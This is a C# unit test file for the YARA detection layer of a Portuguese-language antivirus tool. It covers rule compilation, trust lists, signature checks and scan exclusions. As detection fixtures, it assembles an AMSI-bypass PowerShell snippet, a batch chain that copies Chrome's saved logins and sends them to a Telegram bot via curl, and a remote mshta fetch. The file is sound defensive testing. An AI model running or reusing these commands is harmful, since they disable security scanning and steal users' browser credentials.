using System.Security.Cryptography;
using System.Text;
using FortKnox.Muralha;
using Xunit;

namespace FortKnox.Core.Tests;

/// <summary>
/// Fase 3.5b: camada YARA (regras próprias em Modules/Muralha/Regras), lista de confiança, assinatura de catálogo e as
/// pastas puladas na varredura completa. Conteúdo "malicioso" de teste só em memória e montado em pedaços, para nem este
/// arquivo nem a DLL de testes baterem em antivírus.
/// </summary>
public sealed class MuralhaYaraTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "fkyara-" + Guid.NewGuid().ToString("N"));
    public MuralhaYaraTests() => Directory.CreateDirectory(_dir);
    public void Dispose() { try { Directory.Delete(_dir, true); } catch { } }

    private static readonly Lazy<YaraLayer> Layer = new(() =>
        new YaraLayer(File.ReadAllText(Path.Combine(AppContext.BaseDirectory, "Regras", "fortknox.yar"))));

    private static byte[] Txt(params string[] parts) => Encoding.ASCII.GetBytes(string.Concat(parts));
    private static string Sha(byte[] b) => Convert.ToHexString(SHA256.HashData(b)).ToLowerInvariant();

    [Fact]
    public void OwnRules_Compile()
    {
        Assert.Equal(9, Layer.Value.RuleCount);
    }

    [Fact]
    public void Eicar_IsCaught_InMemory()
    {
        var eicar = Txt("X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-", "ANTIVIRUS-TEST-FILE!$H+H*");
        var hits = Layer.Value.ScanBytes(eicar, ".com");
        Assert.Contains(hits, h => h.Rule == "FK_Eicar" && h.Verdict == Verdict.Malicioso);
    }

    [Fact]
    public void AmsiBypass_InScript_IsSuspect_ButNotInText()
    {
        var script = Txt("$a=[Ref].Assembly.GetType('System.Management.Automation.", "Amsi", "Utils');",
                         "$a.GetField('amsi", "InitFailed','NonPublic,Static').SetValue($null,$true)");
        Assert.Contains(Layer.Value.ScanBytes(script, ".ps1"), h => h.Rule == "FK_PowerShell_Desliga_AMSI");
        Assert.Empty(Layer.Value.ScanBytes(script, ".txt")); // a regra declara as extensões em que vale
    }

    [Fact]
    public void BrowserStealer_NeedsExfiltration()
    {
        var reads = Txt("copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" x; ", "type \"Local State\" | findstr encrypted_key");
        Assert.Empty(Layer.Value.ScanBytes(reads, ".bat")); // ler os arquivos sozinho (um importador de senhas faz isso) não acusa
        var exfil = reads.Concat(Txt(" & curl https://api.", "telegram.org/bot123/sendDocument")).ToArray();
        Assert.Contains(Layer.Value.ScanBytes(exfil, ".bat"), h => h.Rule == "FK_Ladrao_De_Senhas_Do_Navegador");
    }

    [Fact]
    public void Mshta_Remote_IsSuspect_AndHarmlessScriptIsClean()
    {
        Assert.Contains(Layer.Value.ScanBytes(Txt("mshta ", "https://exemplo.invalid/a.hta"), ".cmd"), h => h.Rule == "FK_Script_Executa_Pelo_Regsvr32_Ou_Mshta");
        Assert.Empty(Layer.Value.ScanBytes(Txt("@echo off\r\necho Ola\r\nping 127.0.0.1\r\n"), ".cmd"));
    }

    [Fact]
    public void Evaluate_UsesYaraVerdict_AndTrustListWins()
    {
        var engine = new MuralhaEngine(new SignatureBase()) { UseDefender = false };
        byte[] content = Txt("conteudo qualquer");
        string sha = Sha(content);
        var hits = new[] { new YaraHit("X", Verdict.Suspeito, "Motivo de teste") };
        var r = engine.Evaluate(@"C:\x\a.ps1", ".ps1", sha, content, content.Length, hits);
        Assert.Equal(Verdict.Suspeito, r.Verdict);
        Assert.Equal("yara", r.Layer);
        Assert.Equal("Motivo de teste.", r.Reason);

        engine.Trusted.Add(sha, "Você marcou como confiável.");
        var trusted = engine.Evaluate(@"C:\x\a.ps1", ".ps1", sha, content, content.Length, hits);
        Assert.Equal(Verdict.Limpo, trusted.Verdict);
        Assert.Equal("confiança", trusted.Layer);
    }

    [Fact]
    public async Task ScanFile_RunsYaraLayer_AndSkipsFortKnoxCopies()
    {
        string file = Path.Combine(_dir, "teste.cmd");
        await File.WriteAllTextAsync(file, "mshta " + "https://exemplo.invalid/a.hta");
        var engine = new MuralhaEngine(new SignatureBase()) { UseDefender = false, Yara = Layer.Value.ScanFile };
        var r = await engine.ScanFileAsync(file);
        Assert.Equal(Verdict.Suspeito, r.Verdict);
        Assert.Equal("yara", r.Layer);

        // Uma cópia de um binário do "app" (pasta de mentira) em outro lugar é reconhecida pelo hash.
        string app = Directory.CreateDirectory(Path.Combine(_dir, "app")).FullName;
        File.Copy(file, Path.Combine(app, "x.cmd"));
        engine.Trusted.AddFortKnoxFiles(app);
        var again = await engine.ScanFileAsync(file);
        Assert.Equal(Verdict.Limpo, again.Verdict);
        Assert.Equal(TrustList.FortKnoxReason, again.Reason);
    }

    [Fact]
    public void CatalogSignature_RecognizesWindowsFiles()
    {
        string sys = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "kernel32.dll");
        Assert.True(Trust.IsSignedAndValid(sys) || Trust.IsCatalogSigned(sys));
        string fake = Path.Combine(_dir, "falso.dll");
        File.WriteAllBytes(fake, new byte[] { (byte)'M', (byte)'Z', 0, 0 });
        Assert.False(Trust.IsCatalogSigned(fake));
    }

    [Fact]
    public void Enumerate_SkipsListedFolders()
    {
        string keep = Directory.CreateDirectory(Path.Combine(_dir, "manter")).FullName;
        string skip = Directory.CreateDirectory(Path.Combine(_dir, "pular")).FullName;
        File.WriteAllText(Path.Combine(keep, "a.bat"), "echo a");
        File.WriteAllText(Path.Combine(skip, "b.bat"), "echo b");
        var files = MuralhaEngine.Enumerate(new[] { _dir }, int.MaxValue, default, MuralhaEngine.FullScanSkips(skip + "\\")).ToList();
        Assert.Single(files);
        Assert.EndsWith("a.bat", files[0]);
        Assert.Contains(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "WinSxS"), MuralhaEngine.FullScanSkips());
    }
}
